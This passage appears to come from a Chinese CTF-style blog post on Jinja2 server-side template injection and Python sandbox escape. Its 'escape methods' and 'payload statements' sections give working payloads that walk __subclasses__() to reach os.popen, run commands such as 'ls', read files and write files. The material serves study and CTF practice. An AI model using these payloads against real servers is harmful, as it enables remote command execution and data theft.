+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;__builtins__.__import__(&#39;os&#39;).system(&#39;dir&#39;)</span><br><span class="line">bin		dev		flag		...</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</li>
+</ul>
+<h2 id="逃逸方法"><a href="#逃逸方法" class="headerlink" title="逃逸方法"></a>逃逸方法</h2><p>我们可以通过继承链完成逃逸。</p>
+<p>比如一个读文件语句：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">118</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;NEWS.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p><code>&#39;&#39;</code>返回’str’，mro返回基类，subclasses()来找一下可以利用的子类：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/6.png"></p>
+<p>找到os后，接下来添加上 <code>__init__</code>用传入的参数来初始化实例，使用<code>__globals__</code>以字典返回内建模块，从而成功读取文件。</p>
+<p>可以用脚本来找含有os模块的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">444</span>):</span><br><span class="line">    i=<span class="string">&#x27; &#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[a]</span><br><span class="line">    print(a)</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用语句"><a href="#利用语句" class="headerlink" title="利用语句"></a>利用语句</h2><p><strong>读文件</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;cat /fl4g|base64&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p><strong>写文件</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp&#x27;</span>).write(<span class="string">&#x27;test&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/02/buuctfwp/" rel="prev" title="BUUCTF WP合集">
+      <i class="fa fa-chevron-left"></i> BUUCTF WP合集
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/17/CSRF/" rel="next" title="CSRF">
+      CSRF <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSTI-python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-number">1.</span> <span class="nav-text">SSTI&#x2F;python沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="nav-number">1.2.</span> <span class="nav-text">模板引擎</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9A%84%E5%BD%A2%E6%88%90"><span class="nav-number">1.3.</span> <span class="nav-text">服务端模板注入的形成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.4.</span> <span class="nav-text">flask基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flask"><span class="nav-number">1.4.1.</span> <span class="nav-text">flask</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%B2%E6%9F%93%E6%96%B9%E6%B3%95"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">渲染方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#jinja2"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">jinja2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="nav-number">1.4.1.3.1.</span> <span class="nav-text">语法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">1.4.1.3.2.</span> <span class="nav-text">过滤器</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B"><span class="nav-number">1.5.</span> <span class="nav-text">漏洞举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.6.</span> <span class="nav-text">利用方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-number">2.</span> <span class="nav-text">沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#python%E7%9A%84%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="nav-number">2.1.</span> <span class="nav-text">python的沙箱逃逸的过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95-%E5%B1%9E%E6%80%A7"><span class="nav-number">2.2.</span> <span class="nav-text">一些内置方法&#x2F;属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95"><span class="nav-number">2.3.</span> <span class="nav-text">逃逸方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.4.</span> <span class="nav-text">利用语句</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="jiulin"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">jiulin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">jiulin</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
